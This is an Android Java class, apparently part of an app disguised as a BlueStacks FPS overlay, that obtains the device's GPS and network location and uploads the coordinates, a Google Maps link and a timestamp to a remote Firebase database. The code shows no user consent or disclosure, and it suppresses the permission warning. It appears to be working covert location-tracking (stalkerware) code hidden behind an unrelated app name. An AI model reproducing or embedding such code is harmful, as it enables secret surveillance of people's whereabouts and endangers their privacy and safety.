package com.bluestacks.fpsoverlay;

import android.annotation.SuppressLint;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;
import androidx.annotation.NonNull;
import com.google.firebase.database.DatabaseReference;
import java.util.HashMap;
import java.util.Map;

public class LocationProvider {
    private static final String TAG = "LocationProvider";
    private final Context context;
    private final DatabaseReference dataRef;

    public LocationProvider(Context context, DatabaseReference dataRef) {
        this.context = context;
        this.dataRef = dataRef;
    }

    @SuppressLint("MissingPermission")
    public void requestFreshLocation() {
        LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        LocationListener ll = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location loc) {
                Map<String, Object> m = new HashMap<>();
                m.put("lat", loc.getLatitude());
                m.put("lng", loc.getLongitude());
                m.put("url", "https://www.google.com/maps?q=" + loc.getLatitude() + "," + loc.getLongitude());
                m.put("t", System.currentTimeMillis());
                dataRef.child("location").setValue(m);
                lm.removeUpdates(this);
            }
            @Override public void onStatusChanged(String p, int s, Bundle e) {}
            @Override public void onProviderEnabled(@NonNull String p) {}
            @Override public void onProviderDisabled(@NonNull String p) {}
        };
        try {
            lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, ll);
            lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, ll);
        } catch (Exception e) {
            Log.e(TAG, "Loc Request Fail", e);
        }
    }
}
